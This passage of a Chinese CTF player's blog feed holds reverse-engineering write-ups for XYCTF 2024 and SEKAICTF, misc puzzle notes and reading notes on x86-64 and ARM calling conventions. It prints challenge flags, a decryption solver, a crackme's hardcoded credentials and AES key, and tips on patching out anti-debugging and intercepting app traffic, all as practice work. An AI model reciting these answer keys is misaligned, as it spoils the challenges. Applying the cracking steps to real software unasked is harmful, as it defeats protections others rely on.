__cdecl <span class="title function_">encrypt</span><span class="params">(<span class="type">char</span> *a1, <span class="type">int</span> h9)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [esp+Bh] [ebp-5h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">unsigned</span> __int8)a1[i];</span><br><span class="line">    <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = a1[i];</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= <span class="number">96</span> || v3 &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">64</span> &amp;&amp; v3 &lt;= <span class="number">90</span> )</span><br><span class="line">        v3 = (v3 + h9 - <span class="number">65</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = (v3 + h9 - <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    a1[i] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag{Y0u_KnOw_Crypt0_14_v3ry_Imp0rt@nt!}</p><h2 id="喵喵喵的flag碎了一地-lt-入门-gt"><a href="#喵喵喵的flag碎了一地-lt-入门-gt" class="headerlink" title="喵喵喵的flag碎了一地&lt;入门&gt;"></a>喵喵喵的flag碎了一地&lt;入门&gt;</h2><p>基础IDA三段式</p><p>字符串、引用、函数，</p><p>&#x2F;&#x2F;TODO：不过我觉得在这里就应该把IDA的常用方法说清楚</p><p>flag{My_fl@g_h4s_br0ken_4parT_Bu7_Y0u_c@n_f1x_1t!}</p><p>（草，直接复制的师傅的答案忘记删引用啦（草</p><h2 id="给阿姨倒一杯卡布奇诺"><a href="#给阿姨倒一杯卡布奇诺" class="headerlink" title="给阿姨倒一杯卡布奇诺"></a>给阿姨倒一杯卡布奇诺</h2><p>XYCTF{133bffe401d223a02385d90c5f1ca377}</p><p>注意静态变量 data1 和 data2 的处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#define uint32_t unsigned int</span></span><br><span class="line"></span><br><span class="line">void decrypt(uint32_t *v, uint32_t *key)</span><br><span class="line">&#123;</span><br><span class="line">    static uint32_t data1 = <span class="number">0x5F797274</span>;</span><br><span class="line">    static uint32_t data2 = <span class="number">0x64726168</span>;</span><br><span class="line">    <span class="built_in">int</span> i;   // [rsp+20h] [rbp-10h]</span><br><span class="line">    uint32_t <span class="built_in">sum</span>; // [rsp+24h] [rbp-Ch]</span><br><span class="line">    uint32_t v1;  // [rsp+28h] [rbp-8h]</span><br><span class="line">    uint32_t v0;  // [rsp+2Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0x6E75316C</span> * <span class="number">32</span>;</span><br><span class="line">    uint32_t data1_tmp = v[<span class="number">0</span>];</span><br><span class="line">    uint32_t data2_tmp = v[<span class="number">1</span>];</span><br><span class="line">    v0 = v[<span class="number">0</span>];</span><br><span class="line">    v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">31</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 -= ((v0 &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>]) ^ (v0 + <span class="built_in">sum</span>) ^ (key[<span class="number">2</span>] + <span class="number">16</span> * v0) ^ (<span class="built_in">sum</span> + i);</span><br><span class="line">        v0 -= ((v1 &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]) ^ (v1 + <span class="built_in">sum</span>) ^ (key[<span class="number">0</span>] + <span class="number">16</span> * v1) ^ (<span class="built_in">sum</span> + i);</span><br><span class="line">        <span class="built_in">sum</span> -= <span class="number">0x6E75316C</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0 ^ data1;</span><br><span class="line">    v[<span class="number">1</span>] = v1 ^ data2;</span><br><span class="line">    data1 = data1_tmp;</span><br><span class="line">    data2 = data2_tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t key[<span class="number">4</span>];   // [rsp+60h] [rbp-40h] BYREF</span><br><span class="line">    uint32_t array[<span class="number">8</span>]; // [rsp+70h] [rbp-30h]</span><br><span class="line">    array[<span class="number">0</span>] = <span class="number">0x9B28ED45</span>;</span><br><span class="line">    array[<span class="number">1</span>] = <span class="number">0x145EC6E9</span>;</span><br><span class="line">    array[<span class="number">2</span>] = <span class="number">0x5B27A6C3</span>;</span><br><span class="line">    array[<span class="number">3</span>] = <span class="number">0xE59E75D5</span>;</span><br><span class="line">    array[<span class="number">4</span>] = <span class="number">0xE82C2500</span>;</span><br><span class="line">    array[<span class="number">5</span>] = <span class="number">0xA4211D92</span>;</span><br><span class="line">    array[<span class="number">6</span>] = <span class="number">0xCD8A4B62</span>;</span><br><span class="line">    array[<span class="number">7</span>] = <span class="number">0xA668F440</span>;</span><br><span class="line">    key[<span class="number">0</span>] = <span class="number">0x65766967</span>;</span><br><span class="line">    key[<span class="number">1</span>] = <span class="number">0x756F795F</span>;</span><br><span class="line">    key[<span class="number">2</span>] = <span class="number">0x7075635F</span>;</span><br><span class="line">    key[<span class="number">3</span>] = <span class="number">0x6165745F</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        decrypt(array + i, key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(<span class="string">&quot;%c&quot;</span>, ((char*)array)[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 133bffe401d223a02385d90c5f1ca377</span><br></pre></td></tr></table></figure><h2 id="What’s-this-lt-lua-gt"><a href="#What’s-this-lt-lua-gt" class="headerlink" title="What’s this&lt;\lua&gt;"></a>What’s this&lt;\lua&gt;</h2><p><a href="https://www.52pojie.cn/thread-1224918-1-1.html">https://www.52pojie.cn/thread-1224918-1-1.html</a></p><h2 id="ez-math-lt-Z3-gt"><a href="#ez-math-lt-Z3-gt" class="headerlink" title="ez_math&lt;\Z3&gt;"></a>ez_math&lt;\Z3&gt;</h2><h2 id="ez-enc"><a href="#ez-enc" class="headerlink" title="ez_enc"></a>ez_enc</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XYCTF2024复现-Reverse&quot;&gt;&lt;a href=&quot;#XYCTF2024复现-Reverse&quot; class=&quot;headerlink&quot; title=&quot;XYCTF2024复现|Reverse&quot;&gt;&lt;/a&gt;XYCTF2024复现|Reverse&lt;/h1&gt;&lt;p&gt;&lt;a</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SEKAICTF | Reverse</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/10/11/SEKAICTF%20%20Reverse/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/10/11/SEKAICTF%20%20Reverse/</id>
    <published>2024-10-10T16:00:00.000Z</published>
    <updated>2024-10-30T11:40:00.660Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SEKAICTF-Reverse"><a href="#SEKAICTF-Reverse" class="headerlink" title="SEKAICTF | Reverse"></a>SEKAICTF | Reverse</h1><h2 id="Mobile-Crackme"><a href="#Mobile-Crackme" class="headerlink" title="[Mobile] Crackme"></a>[Mobile] Crackme</h2><blockquote><p>Developed for SekaiCTF 2022 but never got a chance to release it. Can you log in and claim the flag?</p><p>auther:sahuang</p></blockquote><p><a href="https://fluxh4cks.medium.com/solving-crackme-from-sekaictf-9660dc41b0ce">Solving Crackme from SekaiCTF. A reverse engineering challenge that… | by Flux | Aug, 2024 | Medium</a></p><p>I think the blog written by this ctfer is very detailed.</p><p>Briefly describe the following:</p><ul><li><p>Main function dont have page information.</p></li><li><p>Confirm this it is in the Native. unzip by apktool and ollvm”CrackMe&#x2F;assets&#x2F;index.android.bundle”</p><ul><li>a good tools about js ollvm : <a href="https://en.kali.tools/?p=1359">https://en.kali.tools/?p=1359</a></li></ul></li><li><p>find “sekai”:</p><ul><li>uname: <a href="mailto:&#x61;&#x64;&#109;&#x69;&#110;&#64;&#x73;&#x65;&#107;&#97;&#x69;&#x2e;&#x74;&#x65;&#x61;&#109;">&#x61;&#x64;&#109;&#x69;&#110;&#64;&#x73;&#x65;&#107;&#97;&#x69;&#x2e;&#x74;&#x65;&#x61;&#109;</a></li><li>pswd: s3cr3t_SEKAI_P@ss<ul><li>AES: 03afaa672ff078c63d5bdb0ea08be12b09ea53ea822cd2acef36da5b279b9524</li><li>Key: react_native_expo_version_47.0.0</li><li>IV: _<em>sekaictf2023</em>_</li></ul></li></ul></li><li><p>firebase connection (db), after successful authentication,the code references a specific location in the Firebase Realtime Database. use http toolkit to intercept this connection from the app and retrieve the flag from the server that was sent back to the user</p></li></ul><h2 id="X64-Extension"><a href="#X64-Extension" class="headerlink" title="X64 Extension"></a>X64 Extension</h2><blockquote><p>I think implementing Crypto in assembly will make stuff run faster so why not do so?</p><p>auther: lyed</p></blockquote><p><a href="https://github.com/Pusty/writeups/tree/master/SekaiCTF2024">writeups&#x2F;SekaiCTF2024 at master · Pusty&#x2F;writeups</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SEKAICTF-Reverse&quot;&gt;&lt;a href=&quot;#SEKAICTF-Reverse&quot; class=&quot;headerlink&quot; title=&quot;SEKAICTF | Reverse&quot;&gt;&lt;/a&gt;SEKAICTF | Reverse&lt;/h1&gt;&lt;h2 id=&quot;Mobil</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>一些抽象的misc题目（持续记录）</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/10/11/%E4%B8%80%E4%BA%9B%E6%8A%BD%E8%B1%A1%E7%9A%84misc%E9%A2%98%E7%9B%AE/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/10/11/%E4%B8%80%E4%BA%9B%E6%8A%BD%E8%B1%A1%E7%9A%84misc%E9%A2%98%E7%9B%AE/</id>
    <published>2024-10-10T16:00:00.000Z</published>
    <updated>2024-10-30T11:42:26.628Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一些抽象的misc题目"><a href="#一些抽象的misc题目" class="headerlink" title="一些抽象的misc题目"></a>一些抽象的misc题目</h1><h3 id="NTFS特性使用"><a href="#NTFS特性使用" class="headerlink" title="NTFS特性使用"></a>NTFS特性使用</h3><p>题目附件以图片传入——修改后缀</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/ctf-flat.png" alt="ctf-flat"></p><p>修改后缀为vmdl即可</p><p>ntfs隐写</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/3f7911c1c53f4e6c461b3f391737a205.jpeg" alt="img"></p><p>360压缩和7z可以打开为这个界面</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20240920170009908.png" alt="image-20240920170009908"></p><p>ads扔010editor</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20240920170048939.png" alt="image-20240920170048939"></p><p>01 10 01 10 01 10 11 00 01 10 00 01 01 10 01 11 01 11 10 11 00 11 01 00 01 00 01 00 01 01 00 11 01 01 11 11 00 11 00 01 01 10 11 10 01 01 11 11 01 00  01 00 00 11 00 01 01 11 00 11 01 10 10 11 01 11 11 01</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20240920171144264.png" alt="image-20240920171144264"></p><h3 id="嗯——"><a href="#嗯——" class="headerlink" title="嗯——"></a>嗯——</h3><p>VGtSSk1FMXFVWGxPUkVsblRrUlZNRTFwUVRCT1ZGRjVUa1JWTUUxcFFUQk5hbEY1U1VSUk1VNUVTVEJOYWxGNVRrUkpNRTVUUVRCT1ZGRjVUa1JKWjA1RVZUQk9WRkY1U1VSUmVVNUVWVEJPVkZGNVNVUlJlVTVFU1dkT1JFa3dUbE5CTUU1VVVURk9SRWt3VGxOQk1FMXFVVEZPUkZWblRrUlZaMDVFVlRCT1ZGRjVTVVJSTVU1RVNUQk9WRkY1U1VSUk1VNUVWVEJPVTBFd1RsUlJlVTVFVlRCTmFVRXdUbFJSZVU1RVNUQk5hVUV3VGxSUmVVNUVWV2RPUkVrd1RsUlJNVTVFU1dkT1JFa3dUV2xCUzBOblBUMEs&#x3D;</p><p>base64*n–摩斯密码-</p><p>bm专属规划人员表单.docm</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一些抽象的misc题目&quot;&gt;&lt;a href=&quot;#一些抽象的misc题目&quot; class=&quot;headerlink&quot; title=&quot;一些抽象的misc题目&quot;&gt;&lt;/a&gt;一些抽象的misc题目&lt;/h1&gt;&lt;h3 id=&quot;NTFS特性使用&quot;&gt;&lt;a href=&quot;#NTFS特性使用&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>推送的每日一题喵（希望长更新</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/10/11/%E7%9C%9F%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E5%95%8A%EF%BC%9A/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/10/11/%E7%9C%9F%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E5%95%8A%EF%BC%9A/</id>
    <published>2024-10-10T16:00:00.000Z</published>
    <updated>2024-10-30T11:38:32.959Z</updated>
    
    <content type="html"><![CDATA[<p>真每日一题啊：</p><h5 id="2024-x2F-10-x2F-11"><a href="#2024-x2F-10-x2F-11" class="headerlink" title="2024&#x2F;10&#x2F;11"></a>2024&#x2F;10&#x2F;11</h5><p><code>‘ 反调试喵 ’</code></p><p>将所有反调试patch掉运行看buf里的账号密码</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241011231820940.png" alt="image-20241011231820940"></p><p>ictf{n3v3r_53nd_pl41n73x7_cr3d3n71als_70_r3m073}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;真每日一题啊：&lt;/p&gt;
&lt;h5 id=&quot;2024-x2F-10-x2F-11&quot;&gt;&lt;a href=&quot;#2024-x2F-10-x2F-11&quot; class=&quot;headerlink&quot; title=&quot;2024&amp;#x2F;10&amp;#x2F;11&quot;&gt;&lt;/a&gt;2024&amp;#x2F;10&amp;#x</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>《逆向工程基础》还在读ing</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/09/24/%E8%AF%BB%E4%B9%A6/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/09/24/%E8%AF%BB%E4%B9%A6/</id>
    <published>2024-09-23T16:00:00.000Z</published>
    <updated>2024-10-30T11:37:45.105Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题1：EAX在调用printf函数前的操作"><a href="#问题1：EAX在调用printf函数前的操作" class="headerlink" title="问题1：EAX在调用printf函数前的操作"></a>问题1：EAX在调用printf函数前的操作</h2><blockquote><p>代码清单 3.9: GCC 4.4.6 x64   <a href="https://wizardforcel.gitbooks.io/re-for-beginners/content/Part-I/Chapter-03.html">3.3.2</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004004D0                         main proc near</span><br><span class="line">.text:00000000004004D0 48 83 EC 08          sub     rsp, 8</span><br><span class="line">.text:00000000004004D4 BF E8 05 40 00       mov     edi, offset format ;&quot;hello, world&quot;</span><br><span class="line">.text:00000000004004D9 31 C0                xor     eax, eax</span><br><span class="line">.text:00000000004004DB E8 D8 FE FF FF       call     _printf</span><br><span class="line">.text:00000000004004E0 31 C0                xor     eax, eax</span><br><span class="line">.text:00000000004004E2 48 83 C4 08          add     rsp, 8</span><br><span class="line">.text:00000000004004E6 C3                   retn</span><br><span class="line">.text:00000000004004E6                         main endp</span><br></pre></td></tr></table></figure><p>就像看到的那样，在<code>0x4004D4</code>那行写入<code>EDI</code>花了5个字节。如果把这句换成给<code>EDI</code>写入64位的值，会花掉7个字节。显然，GCC在试图节省空间，除此之外，数据段(data segment)中包含的字串不会分配到高于4GiB的地址。</p><p>可以看到在调用printf()函数前，<code>EAX</code>被清空了，这是因为在x86-64的 <code>*NIX</code> 系统上， 使用过的向量寄存器的数量会被存入<code>EAX</code> [Mit13]。</p></blockquote><p><strong>在x86-64的 <code>*NIX</code> 系统上， 使用过的向量寄存器的数量会被存入<code>EAX</code> [Mit13]。</strong></p><p><a href="https://cloud.tencent.com/developer/ask/sof/109154792/answer/133680601">为什么%eax在调用printf之前被归零？</a></p><p>在x86_64 ABI中，如果一个函数有变量参数，那么<code>AL</code> (它是<code>EAX</code>的一部分)应该保存用于保存该函数的参数的向量寄存器的数量。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">printf</span>(<span class="string">&quot;%d&quot;</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>具有整数参数，因此不需要向量寄存器，因此<code>AL</code>设置为0。</p><p>另一方面，如果您将示例更改为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">printf</span>(<span class="string">&quot;%f&quot;</span>, <span class="number">1.</span>0f);</span><br></pre></td></tr></table></figure><p>然后，浮点文字存储在向量寄存器中，相应地，<code>AL</code>被设置为<code>1</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movsd   <span class="title class_">LC1</span>(%rip), %xmm0</span><br><span class="line">leaq    <span class="title class_">LC0</span>(%rip), %rdi</span><br><span class="line">movl    $1, %eax</span><br><span class="line">call    _printf</span><br></pre></td></tr></table></figure><p>如预期的那样：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">printf</span>(<span class="string">&quot;%f %f&quot;</span>, <span class="number">1.</span>0f, <span class="number">2.</span>0f);</span><br></pre></td></tr></table></figure><p>将导致编译器将<code>AL</code>设置为<code>2</code>，因为有两个浮点参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">movsd   <span class="title class_">LC0</span>(%rip), %xmm0</span><br><span class="line">movapd  %xmm0, %xmm1</span><br><span class="line">movsd   <span class="title class_">LC2</span>(%rip), %xmm0</span><br><span class="line">leaq    <span class="title class_">LC1</span>(%rip), %rdi</span><br><span class="line">movl    $2, %eax</span><br><span class="line">call    _printf</span><br></pre></td></tr></table></figure><p>至于你的其他问题：</p><blockquote><p><code>puts</code>也在调用之前将<code>%eax</code>归零，尽管它只需要一个指针。为什么会这样呢？</p></blockquote><p>不应该。例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.<span class="property">h</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">test</span>(<span class="params"><span class="keyword">void</span></span>) &#123;</span><br><span class="line">    <span class="title function_">puts</span>(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>gcc -c -O0 -S</code>编译时，输出如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pushq   %rbp</span><br><span class="line">movq    %rsp, %rbp</span><br><span class="line">leaq    <span class="title class_">LC0</span>(%rip), %rdi</span><br><span class="line">call    _puts</span><br><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>并且<code>%eax</code>没有被零化。但是，如果您删除了<code>#include &lt;stdio.h&gt;</code>，那么生成的程序集在调用<code>puts()</code>之前就会对<code>puts()</code>执行零输出。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pushq   %rbp</span><br><span class="line">movq    %rsp, %rbp</span><br><span class="line">leaq    <span class="title class_">LC0</span>(%rip), %rdi</span><br><span class="line">movl    $0, %eax</span><br><span class="line">call    _puts</span><br><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>原因与你的第二个问题有关：</p><blockquote><p>在调用我自己的void ()函数(即使是-O2设置)之前也会发生这种情况，但是在调用void (Int)函数时不会对其进行零化。</p></blockquote><p>如果编译器没有看到函数的声明，那么它就不会假设它的参数，并且函数很可能接受变量参数。如果您指定一个空参数列表(您不应该这样做，并且它被ISO&#x2F;IEC标记为过时的C特性)，情况也是如此。由于编译器没有足够的函数参数信息，所以它在调用函数之前将<code>%eax</code>从零中剔除，因为函数可能被定义为具有变量参数。</p><p>例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.<span class="property">h</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">puts</span>(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">test</span>(<span class="params"><span class="keyword">void</span></span>) &#123;</span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>function()</code>有一个空参数列表的情况下，结果是：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pushq   %rbp</span><br><span class="line">movq    %rsp, %rbp</span><br><span class="line">movl    $0, %eax</span><br><span class="line">call    _function</span><br><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>但是，如果您遵循在函数不接受任何参数时指定<code>void</code>的推荐做法，如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.<span class="property">h</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="keyword">function</span>(<span class="params"><span class="keyword">void</span></span>) &#123;</span><br><span class="line">    <span class="title function_">puts</span>(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">test</span>(<span class="params"><span class="keyword">void</span></span>) &#123;</span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编译器知道<code>function()</code>不接受参数–特别是它不接受变量参数–因此在调用该函数之前不清除<code>%eax</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pushq   %rbp</span><br><span class="line">movq    %rsp, %rbp</span><br><span class="line">call    _function</span><br><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h2 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h2><h3 id="开启代码优化的Xcode（LLVM）-ARM模式"><a href="#开启代码优化的Xcode（LLVM）-ARM模式" class="headerlink" title="开启代码优化的Xcode（LLVM）(ARM模式)"></a>开启代码优化的Xcode（LLVM）(ARM模式)</h3><p>GCC将第一个<code>printf()</code>函数替换成了<code>puts()</code>。因为<code>printf()</code>函数只有单一参数时，跟<code>puts()</code>函数是类似的。在大多数情况下，<code>printf()</code>的字符串参数里，没有以<code>%</code>开头的特殊控制符的时候，两个函数的会输出相同的结果。如果不是这样，这两个函数的功能会有所差别。</p><p>为什么编译器会替换<code>printf()</code>为<code>puts()</code>呢？这或许是因为<code>puts()</code>更快一些。因为<code>puts()</code>只是做了字串的标准输出(<code>stdout</code>)，而不需要将字符串逐位与<code>%</code>相比较。</p><h3 id="开启代码优化的Xcode-LLVM-编译Thumb-2模式"><a href="#开启代码优化的Xcode-LLVM-编译Thumb-2模式" class="headerlink" title="开启代码优化的Xcode(LLVM)编译Thumb-2模式"></a>开启代码优化的Xcode(LLVM)编译Thumb-2模式</h3><p>这本质上是个到<code>puts()</code>导入地址的转跳。</p><p>可能会有细心的读者要问了:为什么不在需要的时候，直接调用<code>puts()</code>函数呢？</p><p>因为那样做会浪费内存空间。</p><p>大多数程序都会使用额外的动态库(dynamic libraries)(Windows里面的DLL，还有*NIX里面的.so，MAC OS X里面的.dylib),经常使用的库函数会被放入动态库中，当然也包括标准C函数<code>puts()</code>。</p><p>在可执行的二进制文件里(Windows的PE里的.exe文件，ELF和Mach-O文件)都会有输入表段。它是一个用来引入额外模块里模块名称和符号（函数或者全局变量）的列表。</p><p>系统加载器（OS loader）会加载所有需要的模块，当在主模块里枚举输入符号的时候，会确定每个符号真正地址。</p><p>在我们的这个例子里，<code>__imp__puts</code>就是一个系统加载器储存附加模块真正地址的32位的变量。<code>LDR</code>指令把这个值从变量里读取出来，并写入到<code>PC</code>寄存器里，并将控制权交给那个地址。</p><p>所以为了减少系统加载器完成这个过程所需的时间，最好将所有符号的地址一次性写到一个特定的地方。</p><p>另外，我们前面也指出过，我们没办法只用一条指令，并且在不访问内存的情况下，就将一个32位的值保存到寄存器里。因此，最好的办法就是，单独分出一个函数，用来在ARM模式下将控制权交给动态链接库，这样做一些类似与上面这样单一指令的函数（称做Thunk function），然后从Thumb模式里也能去调用。</p><p>在先前的例子中（以ARM模式编译的例子），<code>BL</code>指令也是跳转到了同一个Thunk function里。尽管没有进行模式的转变（所以指令里不存在那个”X”）。</p><h3 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h3><p>对于ARM处理器来说，这是因为指令以以下方式编码：最后一个字节在最前面，接下来是第一个字符(在Thumb 和 Thumb-2模式里)，对于四个字节的操作符则是：首先是第四个字节，然后是第三个，接下来是第二个，最后才是第一个字节(这是由于不同的字节序)。</p><h2 id="第三"><a href="#第三" class="headerlink" 